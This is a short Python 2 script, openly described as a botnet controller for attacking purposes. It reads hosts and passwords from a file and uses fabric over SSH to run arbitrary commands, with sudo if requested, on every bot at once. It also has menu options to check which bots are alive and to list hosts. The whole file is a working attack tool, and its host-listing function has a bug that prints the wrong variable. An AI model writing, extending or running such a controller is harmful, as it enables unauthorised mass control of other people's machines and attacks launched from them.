#!/usr/bin/python

"""

Author: Yusuf Kassim

This script uses the fabric library to construct a botnet by utilizing SSH connections with each bot. The hostname and credentials for each machine will be read from a file, fed to the fabric framework, and a while loop usedto execute commands to all bots. 

The botnet will be used to automate downloads, uploads, and execute commands for attacking purposes.

"""

import paramiko
import sys
from fabric.api import *
from colorama import Fore


with open("hosts","rb") as fobj:
    lines = fobj.read().splitlines()

for line in lines:
    bot,passwd = line.split()
    env.hosts.append(bot)
    env.passwords[bot] = passwd


class BotNet(object):

    def __init__(self):

        self.hosts = env.hosts
        self.passwords = env.passwords
        self.prompt = "[Botnet#] "


    def run_cmd(self,command):

        try:

            with hide("running","stdout","stderr"):

                if "sudo" in command[0:4]:
                    output = sudo(command)
                else:
                    output = run(command)
                
        except:

            output = "Something went wrong"

        return output


    def alive_hosts(self):
        
        for bot,output in execute(self.run_cmd,"uptime",hosts=self.hosts).iteritems():
            if output == "Something went wrong":
                print bot + " is dead"
            else:
                print bot + " is alive"


    def host_list(self):

        for num,host in enumerate(self.hosts):
            print str(num) + " " + bot


    def menu(self):
        
        option = raw_input(self.prompt + "")

        while option.lower() != "quit":

            if option == "1":
                
                command = raw_input("Give a command: ")

                for bot,output in execute(self.run_cmd,command,hosts=self.hosts).iteritems():
                    print Fore.GREEN + bot + ", " + command + "\n" + Fore.RESET
                    print output + "\n"
                    print ("*" * 140) + "\n" 

            elif option == "2":
                self.alive_hosts()

            elif option == "3":
                self.host_list()
            
            print
            option = raw_input(self.prompt + "")

        
test = BotNet()
test.menu()
